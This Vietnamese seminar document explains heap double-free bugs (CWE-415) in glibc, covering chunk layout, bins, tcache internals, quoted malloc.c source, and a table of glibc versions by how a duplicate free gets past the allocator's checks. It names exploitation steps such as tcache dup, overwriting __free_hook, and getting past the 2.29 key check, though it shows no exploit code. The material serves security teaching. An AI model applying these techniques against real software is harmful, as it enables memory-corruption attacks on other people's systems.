# Heap Double Free Attack

Phân tích lỗi giải phóng cùng một vùng nhớ nhiều lần, làm sai lệch trạng thái quản lý heap và có thể dẫn đến hành vi ngoài dự kiến. Trọng tâm là nguyên nhân, tác động và cách bảo đảm mỗi vùng nhớ chỉ được giải phóng đúng một lần.

## Yêu cầu

1. Trình bày khái niệm, nguyên lý và điều kiện phát sinh của lỗ hổng.
2. Xác định và giải thích mã CWE tương ứng.
3. Nhận diện vị trí lỗ hổng trong mã nguồn hoặc binary và phân tích nguyên nhân gây ra lỗ hổng.
4. Liên hệ ít nhất một CVE thực tế có liên quan, bao gồm sản phẩm bị ảnh hưởng, nguyên nhân, tác động, điều kiện khai thác và biện pháp khắc phục. (Phần CVE chỉ yêu cầu nghiên cứu và phân tích thông tin; không bắt buộc reproduce hoặc tái hiện việc khai thác CVE.)
5. Giải thích chuỗi khai thác và mối liên hệ giữa lỗ hổng, CWE, CVE và kỹ thuật khai thác.
6. Thực hiện demo giải 01 challenge CTF hoặc khai thác 1 lỗ hổng liên quan thuộc mảng Pwnable trong môi trường được cấp phép, cô lập và an toàn bằng 2 hướng: 1/ phương pháp thủ công; 2/ phương pháp có sự hỗ trợ của AI.
7. Đề xuất biện pháp khắc phục hoặc phòng ngừa.
8. Phân tích các điều kiện, cơ chế bảo vệ và giới hạn ảnh hưởng đến khả năng khai thác thành công.

## 1. Stack và Heap

![Stack và Heap: biến cục bộ nằm trên stack, đối tượng nằm trên heap](image-1.png)

### 1.1 Stack

Stack là vùng nhớ lưu biến local, tham số hàm (function parameters) và thông tin về function call (như return address).

![Nguyên tắc LIFO: push vào và pop ra ở đỉnh stack](image-2.png)

- Hoạt động theo nguyên tắc LIFO — last in, first out.
- Call stack theo dõi các lời gọi hàm: mỗi lần hàm được gọi, một stack frame được push vào; khi hàm trả về, frame đó bị pop ra.
- Dữ liệu trên stack chỉ tồn tại trong thời gian hàm chạy; khi hàm trả về, biến stack bị hủy và stack pointer quay về vị trí cũ.
- Không phải tự giải phóng bộ nhớ stack như với heap.
- Con trỏ (pointer) là biến lưu địa chỉ bộ nhớ. Trả về con trỏ tới biến local của một hàm là sai — con trỏ đó không còn hợp lệ sau khi hàm kết thúc.
- Kích thước stack do OS quy định (mặc định 8 MB trên Linux, đổi bằng `ulimit -s`); mỗi thread có stack riêng.
- Stack overflow xảy ra khi chương trình dùng nhiều bộ nhớ stack hơn mức được cấp.

### 1.2 Heap

![Mỗi thread có registers và stack riêng; code, data và heap dùng chung](image-3.png)

Heap là vùng nhớ lớn dùng cho cấp phát động, chứa dữ liệu mà kích thước hoặc thời điểm xuất hiện chỉ được biết khi chương trình chạy.

- Cấp phát/giải phóng bằng `malloc()`/`free()` (C/C++).
- Vòng đời dữ liệu do người lập trình kiểm soát (trừ ngôn ngữ có garbage collector).
- Heap thường lớn hơn stack; dùng cho object, cấu trúc dữ liệu lớn (mảng, danh sách liên kết) và dữ liệu cần tồn tại lâu hơn một lần gọi hàm.
- Mỗi thread có stack riêng, heap (main arena) dùng chung; glibc có thể cấp thêm arena phụ cho thread để giảm tranh chấp khóa.

## 2. Quản lý bộ nhớ trong hệ điều hành

Stack và heap ở mục 1 là hai vùng trong **không gian địa chỉ ảo** (virtual address space) mà một tiến trình nhìn thấy — con trỏ trong chương trình luôn là địa chỉ ảo, không phải địa chỉ RAM vật lý. Mục này lùi một bước xuống tầng hệ điều hành để trả lời: ai tạo ra ảo giác "mỗi tiến trình có cả một không gian nhớ liên tục riêng", và vì sao cơ chế đó (virtual memory) lại là tiền đề cho ASLR — cơ chế sẽ quay lại ở mục 7 khi nói về giới hạn khai thác.

Quản lý bộ nhớ là quá trình kiểm soát và tổ chức bộ nhớ thông qua phân bổ các khối cho các chương trình thực thi, nhằm cải thiện hiệu suất tổng thể.

![Phân cấp bộ nhớ: registers, cache, main memory, đĩa, băng từ](image.png)

### 2.1 Kỹ thuật phân bổ bộ nhớ

![Các kỹ thuật quản lý bộ nhớ: contiguous và non-contiguous](image-4.png)

Có hai nhánh phân bổ bộ nhớ: contiguous và non-contiguous. Bài này tập trung vào **Non-Contiguous Memory Allocation**: tiến trình được chia thành nhiều phần nhỏ, lưu ở các vị trí khác nhau trên bộ nhớ chính — tăng hiệu suất và giảm phân mảnh.

Các kỹ thuật được dùng:

- **Paging**: chia tiến trình thành nhiều trang nhớ (page) kích thước cố định, bộ nhớ chia thành từng khung (frame) cùng kích thước.
- **Segmentation**: chia tiến trình thành nhiều đoạn logic kích thước thay đổi (mã lệnh, dữ liệu, stack...).
- **Segmentation with Paging**: kết hợp hai kỹ thuật trên để giảm phân mảnh.

### 2.2 Cơ chế quản lý bộ nhớ

- **Virtual memory**: cấp cho mỗi tiến trình một không gian địa chỉ ảo riêng, ánh xạ tới RAM và swap — nhờ đó chương trình lớn hơn RAM vẫn chạy được. Đây là khái niệm quan trọng nhất của mục 2 đối với seminar: **ASLR** (mục 7) hoạt động bằng cách random hoá vị trí ánh xạ này, khiến attacker không biết trước địa chỉ heap/libc thật — paging (2.1) và PRA (dưới đây) là cơ chế nền, không được dùng lại trực tiếp ở các mục sau.
- **Page Replacement Algorithms (PRA)**: xác định trang nào bị đưa ra khỏi bộ nhớ khi bộ nhớ đầy.
- **Demand Paging**: chỉ nạp trang khi tiến trình thực sự cần — giảm bộ nhớ và I/O không cần thiết.

## 3. Dữ liệu trên heap được lưu thế nào?

Ranh giới cần tách rõ trước khi vào chi tiết: mục 2 là việc **OS** cấp *vùng* địa chỉ ảo cho tiến trình (qua `brk()` để mở rộng heap liền mạch, hoặc `mmap()` để cấp vùng lớn riêng) — OS không biết gì về `malloc()`/`free()` hay "chunk". Việc chia nhỏ vùng đó ra cho từng lời gọi `malloc()` là công việc của một thư viện chạy trong **user-space**, nằm hoàn toàn trong tiến trình, không có đặc quyền kernel. Trên Linux/Unix, khi tiến trình cấp phát động bằng `malloc()`, `calloc()` hay `realloc()`, bộ cấp phát (mặc định là `ptmalloc` trong `glibc`) không lưu thuần dữ liệu người dùng mà đóng gói thành các **heap chunk** gồm metadata + user data.

### 3.1 Cấu trúc một chunk

```text
    Allocated Chunk                      Freed Chunk
+-------------------+                +-------------------+
|     prev_size     |                |     prev_size     |
+-------------------+                +-------------------+
|     size | A|M|P  |                |     size | A|M|P  |
+-------------------+                +-------------------+
|                   |                |        fd         |  (tcache: next)
|     User Data     |                +-------------------+
|   (Payload Area)  |                |        bk         |  (tcache: key, 2.29+)
|                   |                +-------------------+
|                   |                |     Unused...     |
+-------------------+                +-------------------+


An allocated chunk looks like this:

    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of previous chunk, if unallocated (P clear)  |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of chunk, in bytes                     |A|M|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             User data starts here...                          .
	    .                                                               .
	    .             (malloc_usable_size() bytes)                      .
	    .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             (size of chunk, but used for application data)    |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of next chunk, in bytes                |A|0|1|
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+


Free chunks are stored in circular doubly-linked lists, and look like this:

    chunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of previous chunk, if unallocated (P clear)  |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `head:' |             Size of chunk, in bytes                     |A|0|P|
      mem-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Forward pointer to next chunk in list             |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Back pointer to previous chunk in list            |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Unused space (may be 0 bytes long)                .
	    .                                                               .
	    .                                                               |
nextchunk-> +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
    `foot:' |             Size of chunk, in bytes                           |
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	    |             Size of next chunk, in bytes                |A|0|0|
	    +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

```


- `prev_size`: kích thước chunk liền trước; chỉ có ý nghĩa khi chunk đó đang rảnh (bit `P` của chunk hiện tại bằng 0).
- `size`: kích thước chunk hiện tại, **tính cả header 0x10 byte**; luôn là bội số của 16, tối thiểu 0x20 (64-bit). 3 bit thấp là cờ trạng thái:
  - `P` (PREV_INUSE): bằng 1 nếu chunk liền trước đang được dùng.
  - `M` (IS_MMAPPED): đánh dấu chunk được cấp trực tiếp bằng `mmap()`.
  - `A` (NON_MAIN_ARENA): đánh dấu chunk thuộc arena phụ.
- Khi chunk bị `free()`, 16 byte đầu của user data trở thành con trỏ của danh sách liên kết:
  - `fd`/`next`: trỏ tới chunk kế tiếp trong bin;
  - `bk`: trỏ tới chunk trước đó (bin liên kết đôi); với tcache, ô này là `key` — dùng để phát hiện double free (glibc 2.29+).

Hai khái niệm đi kèm (dùng lại ở các phần sau):

- **top chunk (wilderness)**: chunk trống cuối cùng của heap; mỗi lần cấp phát, allocator cắt dần từ top; hết chỗ thì mở rộng heap bằng `brk` hoặc `mmap()`.
- **consolidation (hợp nhất)**: khi free, nếu chunk kề với một chunk rảnh khác (hoặc top), chúng được gộp thành một chunk lớn hơn.

## 4. Bins & cấp phát bộ nhớ

Khi `free()` được gọi, chunk không được trả ngay cho OS mà được phân loại vào các danh sách liên kết gọi là **bin**, tuỳ theo kích thước và trạng thái.

### 4.1 Tổng quan 5 loại bin

| Bin | Cấu trúc | Kích thước chunk (64-bit) | Thứ tự | Đặc điểm chính |
| --- | --- | --- | --- | --- |
| **tcache** | liên kết đơn, riêng mỗi thread | ≤ `0x410` (dữ liệu ≤ 1032 B) | LIFO | tối đa 7 chunk/bin; không cần lock; có `key` (2.29+) và safe-linking (2.32+) |
| **fastbin** | liên kết đơn | ≤ `0x80` (dữ liệu ≤ 120 B) | LIFO | không coalesce; khi free chỉ kiểm tra trùng với phần tử đầu danh sách |
| **unsorted bin** | liên kết đôi | các chunk còn lại, chưa phân loại | FIFO | "trạm trung chuyển" khi free; nguồn leak địa chỉ libc phổ biến |
| **smallbin** | liên kết đôi | < `0x400` | FIFO | mỗi bin ứng với một kích thước cố định |
| **largebin** | liên kết đôi | ≥ `0x400` | size giảm dần | tối ưu cho thuật toán best-fit |

Ghi chú:

- **tcache** ra đời ở glibc 2.26 nhằm giảm tranh chấp khóa giữa các thread (trước đó mọi thread dùng chung arena).
- Thứ tự khi free: chunk nhỏ vào tcache trước; nếu bin tcache đầy (7 chunk) mới xuống fastbin; còn lại vào unsorted bin và được phân loại về smallbin/largebin ở lần `malloc()` kế tiếp.
- Tắt tcache khi nghiên cứu: `GLIBC_TUNABLES=glibc.malloc.tcache_count=0 ./binary`.

### 4.2 Tcache — bản chất, lý do ra đời và cấu trúc chi tiết

Bảng ở 4.1 xếp tcache là một trong 5 loại bin, nhưng nó khác biệt đủ nhiều — cả về vai trò lẫn rủi ro bảo mật (toàn bộ mục 5–6 sau này đều xoay quanh nó) — nên đáng một mục riêng, đi từ "vì sao glibc cần nó" tới "nó được ghép ra sao" bằng đúng source thật.

**a) Vấn đề trước khi có tcache: một ổ khóa cho mọi thread.** Trước glibc 2.26 (2017), mọi `malloc()`/`free()` của một process — dù chạy trên bao nhiêu thread — đều phải tranh nhau một (hoặc vài) **arena**, và mỗi arena có **một mutex** bảo vệ các bin ở mục 4.1. Một chương trình đa luồng cấp phát/giải phóng liên tục nhiều object nhỏ (worker pool, bộ nhớ tạm trong hot loop...) sẽ làm các thread **khóa chờ nhau** chỉ để chèn/rút một chunk vài chục byte — chi phí đồng bộ hoá còn tốn hơn chi phí cấp phát thật. Đây là bottleneck được đo đạc thực tế trong glibc (bug 17195), và tcache (**thread cache** — đúng nghĩa đen) là bản vá.

**b) Giải pháp: một cache riêng, không khóa, cho từng thread.** Ý tưởng: đặt một lớp đệm nhỏ, riêng của từng thread, nằm *trước* arena/bin ở mục 4.1. `free()` đẩy chunk vào cache của chính thread gọi nó; `malloc()` rút ra từ đó trước khi chạm tới arena. Vì cache này **không ai khác chạm được** (mỗi thread chỉ thấy cache của riêng mình, khai báo bằng từ khoá `__thread` trong C — biến toàn cục nhưng mỗi thread giữ một bản sao độc lập), toàn bộ việc đẩy/rút **không cần mutex**. Đây là nguồn gốc tốc độ — và cũng là nguồn gốc rủi ro: không khóa đồng nghĩa không có "người gác cổng" nào kiểm tra tính hợp lệ ngoài vài dòng code sẽ đọc ở mục 5.1.

**c) Cấu trúc dữ liệu thật — `tcache_perthread_struct` (malloc.c:2914–2921, tag glibc-2.27):**

```c
typedef struct tcache_perthread_struct
{
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
} tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache = NULL;
```

Đây là **toàn bộ** bộ nhớ "sổ sách" của tcache cho một thread — không hơn:

| Thành phần | Kiểu | Ý nghĩa |
| --- | --- | --- |
| `counts[64]` | `char[64]` | `counts[idx]` = số chunk hiện đang nằm trong bin `idx` (0–7) |
| `entries[64]` | `tcache_entry*[64]` | `entries[idx]` = con trỏ tới chunk **đầu** danh sách liên kết đơn của bin `idx` (hoặc `NULL` nếu rỗng) |
| `tcache` | con trỏ `__thread` | mỗi thread có một bản riêng, trỏ tới struct trên — đây là biến mà `tcache_put`/`tcache_get` (mục 5.1) đọc/ghi |

`TCACHE_MAX_BINS = 64` (malloc.c:304) — tcache quản lý **64 size class** cùng lúc, mỗi class là một bin LIFO độc lập (tưởng tượng như 64 "ngăn kéo" xếp theo kích thước).

```text
tcache (con trỏ __thread, riêng cho thread hiện tại)
  |
  v
tcache_perthread_struct
 +----------------+----------------+
 | counts[64]     | entries[64]    |
 |----------------|----------------|
 | idx 0  : 0     | idx 0  : NULL  |
 | idx 1  : 0     | idx 1  : NULL  |
 |  ...   : ...   |  ...   : ...   |
 | idx 14 : 2     | idx 14 : *-----+--> [ h | next ] --> [ i | next ] --> NULL
 |  ...   : ...   |  ...   : ...   |      (chunk 0x100)     (chunk 0x100)
 | idx 63 : 0     | idx 63 : NULL  |
 +----------------+----------------+

 counts[14]=2 khớp số chunk trong list entries[14]; mỗi node là một chunk đã
 free, 8 byte đầu user data bị mượn làm trường "next" (mục 3.1, 4.2-d).
 Ví dụ số liệu lấy từ chuỗi free(i); free(h); ở mục 5.5.
```

**d) Chunk bên trong một bin — `tcache_entry` (malloc.c:2904–2907):** khi một chunk được free vào tcache, 16 byte đầu user data (mục 3.1) bị "mượn" làm node của linked-list:

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* glibc ≥ 2.29 thêm: struct tcache_perthread_struct *key; (mục 5.4, 6.3) */
} tcache_entry;
```

`next` trỏ tới chunk kế tiếp trong **cùng bin** — danh sách liên kết **đơn** (không có `bk` quay lại như smallbin/largebin ở 4.1, vì tcache chỉ push/pop ở đầu, không cần duyệt ngược).

**e) Ánh xạ kích thước → chỉ số bin — `csize2tidx` (malloc.c:308, 311):**

```c
# define csize2tidx(x) (((x) - MINSIZE + MALLOC_ALIGNMENT - 1) / MALLOC_ALIGNMENT)
# define tidx2usize(idx) (((size_t) idx) * MALLOC_ALIGNMENT + MINSIZE - SIZE_SZ)
```

Trên 64-bit: `MINSIZE = 0x20`, `MALLOC_ALIGNMENT = 16`, `SIZE_SZ = 8`. Thử với đúng số liệu dùng ở ví dụ mục 5.5: chunk `0x100` (256) cho `idx = (256 − 32 + 15) / 16 = 14`; ngược lại `tidx2usize(14) = 14×16 + 32 − 8 = 248` — **khớp chính xác** `BUFSIZE2 = 248`. Đây là lý do `i`, `h` trong ví dụ đó luôn rơi vào cùng một `entries[14]`, bất kể thứ tự free — hai request `malloc(248)` khác nhau luôn quy về cùng một "ngăn kéo".

**f) Tcache sinh ra khi nào, và tự nó tốn chỗ ở đâu — `tcache_init()` (malloc.c:2977–3002, rút gọn):** struct ở (c) không tồn tại sẵn — nó được cấp phát **lười** (lazy), đúng một lần cho mỗi thread, ngay lần `malloc()`/`free()` đầu tiên của thread đó:

```c
# define MAYBE_INIT_TCACHE() \
  if (__glibc_unlikely (tcache == NULL)) \
    tcache_init();

static void
tcache_init (void)
{
  mstate ar_ptr;
  const size_t bytes = sizeof (tcache_perthread_struct);

  arena_get (ar_ptr, bytes);          /* <- khóa arena, DUY NHẤT một lần */
  void *victim = _int_malloc (ar_ptr, bytes);
  if (ar_ptr != NULL)
    __libc_lock_unlock (ar_ptr->mutex);

  if (victim)
    {
      tcache = (tcache_perthread_struct *) victim;
      memset (tcache, 0, sizeof (tcache_perthread_struct));
    }
}
```

Đọc kỹ dòng `_int_malloc (ar_ptr, bytes)`: chính struct quản lý tcache **cũng là một chunk heap bình thường**, lấy bằng con đường chậm/có khóa như mục 4.1. Đây là bằng chứng cụ thể cho lý lẽ ở (a)-(b): khóa arena chỉ bị trả giá **một lần duy nhất** lúc khởi tạo; mọi `tcache_put`/`tcache_get` sau đó (mục 5.1) không gọi `arena_get`/`__libc_lock_unlock` ở đâu cả — đúng như thiết kế. Hệ quả phụ quan trọng cho pwnable: với một binary đơn giản, đây thường là **chunk heap đầu tiên** được cấp — tiền đề cho kỹ thuật tấn công trực tiếp vào `tcache_perthread_struct` ở mục 6.5 (Tcache metadata attack).

**g) Giới hạn mặc định:**

| Hằng số | Giá trị mặc định | Nguồn | Ý nghĩa |
| --- | --- | --- | --- |
| `TCACHE_MAX_BINS` | 64 | malloc.c:304 | số size class quản lý |
| `TCACHE_FILL_COUNT` | 7 | malloc.c:323 | số chunk tối đa mỗi bin (`counts[idx]`) |
| `tcache_max_bytes` | 1032 B (`tidx2usize(63)`) | malloc.c:1795 | request lớn hơn mức này **không** qua tcache, đi thẳng mục 4.1 |

Cả ba đều là **tunable** (`GLIBC_TUNABLES=glibc.malloc.tcache_count=...`) — không phải hằng số cứng của ABI, nên không được giả định cố định khi phân tích một binary cụ thể (một số bản phân phối mới hơn đã chỉnh các giá trị này, mục 5.4 bảng).

**h) Vị trí của tcache trong đường đi `malloc()`/`free()`:** tổng kết một câu trước khi sang mục 5 — tcache là **trạm dừng đầu tiên**, không phải trạm duy nhất. `free()` thử đẩy vào tcache trước; chỉ khi bin đầy hoặc chunk quá lớn mới rơi xuống fastbin/unsorted bin ở mục 4.1 — đúng chuỗi `#if USE_TCACHE ... #endif` mà mục 5.1 sẽ trích nguyên dòng source để chỉ ra chính xác đây là nơi thiếu kiểm tra double free.

## 5. Double free

**Bản chất:** `free()` được gọi nhiều hơn một lần trên cùng một vùng nhớ là hành vi không xác định (undefined behavior). Hệ quả cụ thể là làm hỏng chính các danh sách bin vừa trình bày ở mục 4 — ví dụ một chunk bị chèn hai lần vào cùng một tcache/fastbin, phá vỡ tính đúng đắn của linked list mà allocator dùng để tái sử dụng chunk. Các bước kiểm tra và đường khai thác phụ thuộc vào phiên bản glibc, loại bin, kích thước chunk và các cơ chế giảm thiểu.

Mẫu cơ bản trên fastbin (các phiên bản cũ) là `free(a); free(b); free(a)`: fastbin chỉ loại bỏ bản trùng ở **đầu danh sách**, nên các lần free xen kẽ vẫn thỏa mãn kiểm tra. Đây không phải bypass tổng quát — tcache có cơ chế phát hiện trùng riêng (2.29+) và safe-linking (2.32+) bảo vệ con trỏ.

**Hệ quả:** lần `malloc()` kế tiếp có thể trả về chính vùng nhớ đã bị free hai lần → hai con trỏ cùng trỏ một vùng nhớ. Một con trỏ có thể dùng để ghi đè dữ liệu/metadata trong khi con trỏ kia vẫn được chương trình tin cậy sử dụng, dẫn tới giả mạo con trỏ, ghi dữ liệu tuỳ ý và chiếm luồng thực thi.

### 5.1 `free()` và `malloc()` nhìn từ source code glibc

Trước khi nói "double free nguy hiểm", cần thấy đúng `free()`/`malloc()` làm gì bên trong. Các trích dẫn dưới đây lấy từ `malloc/malloc.c`, tag `glibc-2.27` (đại diện nhánh 2.26–2.28 dùng cho ví dụ ở mục 5.5), mirror chính thức [bminor/glibc](https://github.com/bminor/glibc/blob/glibc-2.27/malloc/malloc.c).

**`free()` thật là `__libc_free` (malloc.c:3085):**

```c
void
__libc_free (void *mem)
{
  mstate ar_ptr;
  mchunkptr p;

  void (*hook) (void *, const void *)
    = atomic_forced_read (__free_hook);
  if (__builtin_expect (hook != NULL, 0))
    {
      (*hook)(mem, RETURN_ADDRESS (0));
      return;
    }

  if (mem == 0)
    return;

  p = mem2chunk (mem);
  ...
```

Dòng đầu tiên **không phải** kiểm tra con trỏ — mà đọc một con trỏ hàm toàn cục `__free_hook` (khai báo ở malloc.c:1864: `void weak_variable (*__free_hook) (void *, const void *) = NULL;`). Nếu `__free_hook` khác `NULL`, `free()` gọi thẳng tới đó và **return ngay**, bỏ qua toàn bộ logic allocator phía dưới — kể cả `mem2chunk`. glibc 2.34 mới gỡ hẳn cơ chế này (mục 6.1); với 2.26–2.28, `__free_hook` vẫn là mục tiêu ghi đè kinh điển (Sink B, mục 5.5).

**Hệ quả cụ thể nằm ở `_int_free`, nhánh tcache (malloc.c:4165–4177):**

```c
#if USE_TCACHE
  {
    size_t tc_idx = csize2tidx (size);

    if (tcache
	&& tc_idx < mp_.tcache_bins
	&& tcache->counts[tc_idx] < mp_.tcache_count)
      {
	tcache_put (p, tc_idx);
	return;
      }
  }
#endif
```

Điều kiện duy nhất để một chunk được đẩy vào tcache là **còn chỗ trống** (`counts[tc_idx] < tcache_count`, tối đa 7 — mục 4). Không dòng nào kiểm tra "chunk này đã có trong bin chưa" — đây không phải một bước bị bỏ sót ngẫu nhiên, mà là thiết kế gốc của tcache (thêm ở 2.26) chưa tính tới double free.

**`tcache_put`/`tcache_get` — cơ chế LIFO thật (malloc.c:2926–2946):**

```c
...
typedef struct tcache_entry
{
  struct tcache_entry *next;
} tcache_entry;
...


static __always_inline void
tcache_put (mchunkptr chunk, size_t tc_idx)
{
  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);
  assert (tc_idx < TCACHE_MAX_BINS);
  e->next = tcache->entries[tc_idx];
  tcache->entries[tc_idx] = e;
  ++(tcache->counts[tc_idx]);
}

static __always_inline void *
tcache_get (size_t tc_idx)
{
  tcache_entry *e = tcache->entries[tc_idx];
  assert (tc_idx < TCACHE_MAX_BINS);
  tcache->entries[tc_idx] = e->next;
  --(tcache->counts[tc_idx]);
  return (void *) e;
}
```

`tcache_put` ghi `e->next` vào **đúng 8 byte đầu user data** của chunk vừa free (mục 3.1) — đây là dòng biến user data thành con trỏ linked-list. `tcache_get` chỉ đọc lại `entries[tc_idx]` và trả về **y nguyên giá trị đó**, không kiểm tra chunk còn "sống" hay đã bị chương trình dùng việc khác. Đây là lý do một `next` bị ghi đè (tcache poisoning, mục 6.4) được `malloc()` tin tưởng tuyệt đối ở lần gọi kế tiếp.

**`malloc()` thật là `__libc_malloc` (malloc.c:3027–3052):**

```c
void *
__libc_malloc (size_t bytes)
{
  ...
  void *(*hook) (size_t, const void *)
    = atomic_forced_read (__malloc_hook);
  if (__builtin_expect (hook != NULL, 0))
    return (*hook)(bytes, RETURN_ADDRESS (0));
#if USE_TCACHE
  size_t tc_idx = csize2tidx (tbytes);
  MAYBE_INIT_TCACHE ();

  if (tc_idx < mp_.tcache_bins
      && tcache
      && tcache->entries[tc_idx] != NULL)
    {
      return tcache_get (tc_idx);
    }
#endif
  ...
```

Giống `free()`, `malloc()` kiểm tra `__malloc_hook` trước (malloc.c:1866). Nhưng điểm mấu chốt cho double free: nếu bin tương ứng còn entry, `malloc()` trả ngay kết quả `tcache_get()` — **không chạm `_int_malloc`, không kiểm tra gì thêm**. Toàn bộ khoảng cách giữa một `free()` bị lỗi và một `malloc()` trả về địa chỉ tuỳ ý chỉ là dòng `tcache_get()` này — không có lớp bảo vệ nào nằm giữa.

### 5.2 Điều kiện phát sinh

- **Cốt lõi:** `free()` được gọi hai lần lên cùng một địa chỉ và giữa hai lần đó vùng nhớ không được cấp phát lại — tức con trỏ không được đặt về `NULL` sau `free()`, hoặc có hai con trỏ alias cùng trỏ một vùng nhớ.
- **Các mẫu code điển hình:**
  - hai con trỏ alias: `p = q = malloc(...); free(p); free(q);`
  - nhánh xử lý lỗi đã `free()`, rồi nhánh cleanup chung `free()` lại
  - copy nông (shallow copy) struct/object chứa con trỏ
  - `free()` xong không `NULL` hóa → destructor/cleanup gọi lần hai
  - use-after-free (CWE-416) dẫn tới `free()` lần nữa
  - `realloc()` hỏng rồi `free()` cả con trỏ cũ lẫn mới
  - đa luồng: hai thread cùng `free()` một object, hoặc sai refcount
- **Lọt qua allocator hay không:** không phải mọi lần free trùng đều bị chặn — phụ thuộc phiên bản glibc (mục 5.4).
- **Nguyên nhân gốc:** quyền sở hữu vùng nhớ không rõ ràng hoặc không được quản lý tại một chỗ duy nhất.

### 5.3 CWE liên quan

| Mã | Tên | Liên hệ |
| --- | --- | --- |
| **CWE-415** | Double Free | Gọi `free()` hai lần lên cùng một địa chỉ — lỗ hổng trung tâm của seminar |
| CWE-416 | Use After Free | Thường là tiền đề hoặc hệ quả: dùng con trỏ sau khi free rồi free lại; bản thân double free cũng tạo ra UAF (hai con trỏ cùng trỏ một vùng nhớ) |

### 5.4 Free trùng có lọt qua allocator?

| glibc | Kiểm tra của allocator | Hành vi free trùng | Bản phân phối tiêu biểu |
| --- | --- | --- | --- |
| ≤ 2.25 | chưa có tcache; fastbin chỉ so phần tử đầu danh sách | Lọt nếu free xen kẽ: `free(a); free(b); free(a)` | CentOS 7 (2.17), Ubuntu 16.04 (2.23), Debian 9 (2.24) |
| 2.26 – 2.28 | có tcache nhưng chưa kiểm tra trùng lặp | `free(a); free(a)` lọt ngay (tcache dup) | Ubuntu 18.04 (2.27), RHEL 8 (2.28), Debian 10 (2.28) |
| 2.29 – 2.31 | tcache kiểm tra `key` + duyệt danh sách | Phải ghi đè `key` (qua UAF) hoặc lấp đầy tcache bin để chunk rơi xuống fastbin, rồi free xen kẽ | Ubuntu 20.04 (2.31), Debian 11 (2.31) |
| ≥ 2.32 | thêm safe-linking cho con trỏ `next` của tcache/fastbin | Vẫn lọt như trên, nhưng giả mạo `next` cần heap leak | RHEL 9 (2.34), Ubuntu 22.04 (2.35), Debian 12 (2.36), Ubuntu 24.04 (2.39) |
| ≥ 2.42 | tcache mở rộng: `glibc.malloc.tcache_max` có thể tăng tới 4 MiB | Giả định "chunk > `0x410` là vào unsorted bin" không còn luôn đúng | Ubuntu 25.10+, Fedora 43+ (2.42) |

Ghi chú:

- tcache có từ glibc 2.26, áp dụng cho chunk ≤ `0x410`, mỗi bin tối đa 7 chunk; tắt bằng `GLIBC_TUNABLES=glibc.malloc.tcache_count=0`.
- Safe-linking chỉ mã hóa con trỏ `next` (`fd`), **không** chặn double free.
- Thông báo abort điển hình: `double free or corruption (fasttop)` (fastbin) và `free(): double free detected in tcache 2` (tcache, 2.29+) — dẫn chứng source ngay dưới.
- Chunk trong ví dụ ở mục 5.5 (`BUFSIZE2 = 248` → chunk `0x100`) thuộc tcache, không phải fastbin (`0x100 > 0x80`) → đây là kịch bản **tcache dup** trên glibc 2.26–2.28.

#### Dẫn chứng source: vì sao 2.26–2.28 lọt, 2.29 chặn

`tcache_put` ở glibc 2.27 (malloc.c:2926–2933, trích ở mục 5.1) không có trường nào đánh dấu "chunk đã nằm trong tcache" — `e->next` là **toàn bộ** state được ghi khi free. Từ glibc 2.29, struct `tcache_entry` (malloc.c:2904–2909) thêm trường `key`:

```c
typedef struct tcache_entry
{
  struct tcache_entry *next;
  /* This field exists to detect double frees.  */
  struct tcache_perthread_struct *key;
} tcache_entry;
```

`tcache_put` (malloc.c:2935) gán `e->key = tcache` — con trỏ tới chính `tcache_perthread_struct` của thread hiện tại; `tcache_get` (malloc.c:2952) xoá nó về `NULL` khi chunk được cấp lại hợp lệ. `_int_free` (malloc.c:4201–4209) kiểm tra lại trường này trước khi chấp nhận một free mới:

```c
	tcache_entry *e = (tcache_entry *) chunk2mem (p);

	if (__glibc_unlikely (e->key == tcache))
	  {
	    tcache_entry *tmp;
	    for (tmp = tcache->entries[tc_idx]; tmp; tmp = tmp->next)
	      if (tmp == e)
		malloc_printerr ("free(): double free detected in tcache 2");
	  }
```

Đây chính là nơi sinh ra thông báo abort đã nêu ở Ghi chú trên. Chú ý comment ngay trong source gốc (không phải diễn giải lại): *"we don't 100% trust it (it also matches random payload data at a 1 in 2^<size_t> chance), so verify it's not an unlikely coincidence before aborting"* — glibc tự nhận `key` có thể trùng ngẫu nhiên, nên phải duyệt lại toàn bộ list (`for` loop) để xác nhận trước khi gọi `malloc_printerr`. Đây là lý do bảng ở trên ghi "key + duyệt danh sách" chứ không chỉ "key".

